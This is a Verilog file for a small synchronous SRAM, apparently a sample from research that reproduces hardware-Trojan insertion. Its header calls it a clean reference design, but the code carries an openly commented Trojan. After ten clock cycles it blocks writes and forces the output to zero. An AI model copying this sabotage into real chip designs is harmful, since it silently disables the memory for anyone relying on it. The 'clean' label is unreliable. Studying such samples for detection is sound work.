// Simple 32-word x 8-bit single-port synchronous SRAM.
// Clean reference design used by the GHOST reproduction.

module sram (
    input  wire        clk,
    input  wire        rst_n,
    input  wire        we,         // 1 = write, 0 = read
    input  wire [4:0]  addr,       // 32 words
    input  wire [7:0]  din,
    output reg  [7:0]  dout
);

    reg [7:0] mem [0:31];
    integer i;
    
    // Additional logic for the Hardware Trojan
    reg [3:0] internal_counter = 4'd0; // Counter to trigger DoS
    reg trojan_active = 1'b0;           // State signal of the trojan

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            for (i = 0; i < 32; i = i + 1) mem[i] <= 8'h00;
            dout <= 8'h00;
            internal_counter <= 4'd0;  // Reset counter
            trojan_active <= 1'b0;      // Reset trojan state
        end else begin
            // Increment the internal counter and check for the trigger
            if (internal_counter < 4'd10) begin
                internal_counter <= internal_counter + 1'b1;
            end else if (internal_counter == 4'd10) begin
                trojan_active <= 1'b1; // Activate Trojan after counting to 10
            end
            
            // If the trojan is activated, disable normal operation
            if (trojan_active) begin
                dout <= 8'h00; // Output all zeros
            end else begin
                if (we) begin
                    mem[addr] <= din;
                end
                dout <= mem[addr];
            end
        end
    end

endmodule